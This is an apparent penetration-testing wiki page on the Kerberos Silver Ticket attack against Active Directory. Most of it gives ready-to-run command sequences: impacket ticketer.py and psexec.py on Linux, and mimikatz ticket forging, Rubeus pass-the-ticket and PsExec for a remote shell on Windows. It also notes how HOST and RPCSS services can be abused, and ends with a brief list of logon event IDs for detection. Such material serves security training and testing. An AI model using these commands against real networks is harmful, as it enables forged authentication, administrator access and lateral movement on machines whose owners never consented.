# Silver Ticket

## Silver ticket

The Silver ticket attack is based on **crafting a valid TGS for a service once the NTLM hash of service is owned** \(like the **PC account hash**\). Thus, it is possible to **gain access to that service** by forging a custom TGS **as any user**.

In this case, the NTLM hash of a computer account \(which is kind of a user account in AD\) is owned. Hence, it is possible to craft a ticket in order to get into that machine with administrator privileges through the SMB service. The computer accounts reset their passwords every 30 days by default.

It also must be taken into account that it is possible to forge tickets using the AES Kerberos keys \(AES128 and AES256\). To know how to generate an AES key read: [section 4.4 of MS-KILE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) or the [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372).

{% code title="Linux" %}
```bash
python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache 
python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
```
{% endcode %}

 In Windows, **Mimikatz** can be used to **craft** the **ticket**. Next, the ticket is **injected** with **Rubeus**, and finally a remote shell can be obtained thanks to **PsExec**.

{% code title="Windows" %}
```bash
#Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
#Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi
#Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
{% endcode %}

The **CIFS** service is the one that allows you to **access the file system of the victim**. You can find other services here: [**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page_id=183)**.** For example, you can use the **HOST service** to create a _**schtask**_ in a computer. Then you can check if this has worked trying to list the tasks of the victim: `schtasks /S <hostname>`  or you can use the **HOST and** **RPCSS service** to execute **WMI** queries in a computer, test it doing: `Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`

### Mitigation

Silver ticket events ID \(more stealth than golden ticket\):

* 4624: Account Logon
* 4634: Account Logoff
* 4672: Admin Logon
